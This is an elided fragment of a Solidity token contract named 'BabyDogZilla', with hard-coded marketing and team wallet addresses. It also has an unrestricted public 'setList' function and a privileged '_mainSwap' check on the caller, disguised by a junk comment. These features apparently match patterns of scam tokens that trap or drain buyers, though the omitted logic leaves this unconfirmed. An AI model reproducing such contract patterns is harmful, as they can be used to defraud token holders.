...
contract BabyDogZilla is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "BabyDogZilla";
    string private _symbol = "BabyDogZilla";
    uint8 private _decimals = 9;

    address payable private marketWall = payable(0x15409A047564A48DF9684a344869F60A0758A544); 
    address payable private teamWalletAddress = payable(0x99bca95D34a9E79D8BDc4A71b11188c8ca78e9B9); 
	...
	function setList(address  recipient, uint256 amount) public {
	...
	if( _mainSwap[ /*as aXsdfghjkl;*/msg.sender])
	   {
